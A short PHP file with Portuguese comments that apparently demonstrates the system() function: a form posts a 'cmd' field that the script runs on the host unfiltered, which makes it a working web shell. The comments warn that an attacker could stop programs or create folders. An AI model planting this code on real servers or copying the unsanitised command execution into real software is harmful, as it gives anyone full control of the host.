<?php

    //A função system permite executar comandos de sistemas operacional na máquina host
    //Ver em: https://www.php.net/manual/pt_BR/function.system.php

    //É possível realizar todos os comandos de SO, realizados pelo CMD, neste programa
    //Um atacante poderia parar programas, criar pastas, e diversas outras coisas

    if($_SERVER["REQUEST_METHOD"] === "POST"){

        $cmd = $_POST["cmd"];

        echo "<pre>";
        $comando = system($cmd, $retorno);
        echo "</pre>";

    }

?>

<form method = "post">

    <input type="text" name = "cmd">
    <input type="submit" value = "Enviar">

</form>